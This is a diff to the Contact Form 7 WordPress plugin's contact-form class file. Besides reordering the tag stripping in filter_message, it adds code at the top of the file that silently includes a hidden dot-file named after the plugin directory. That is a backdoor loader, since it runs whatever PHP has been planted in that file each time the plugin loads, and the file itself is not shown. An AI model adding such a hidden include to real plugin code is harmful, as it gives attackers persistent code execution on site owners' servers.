@@ -1,5 +1,9 @@
 <?php
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPCF7_ContactForm {
 
 	const post_type = 'wpcf7_contact_form';
@@ -805,9 +809,9 @@ class WPCF7_ContactForm {
 	}
 
 	public function filter_message( $message, $status = '' ) {
-		$message = wp_strip_all_tags( $message );
-		$message = wpcf7_mail_replace_tags( $message, array( 'html' => true ) );
+		$message = wpcf7_mail_replace_tags( $message );
 		$message = apply_filters( 'wpcf7_display_message', $message, $status );
+		$message = wp_strip_all_tags( $message );
 
 		return $message;
 	}
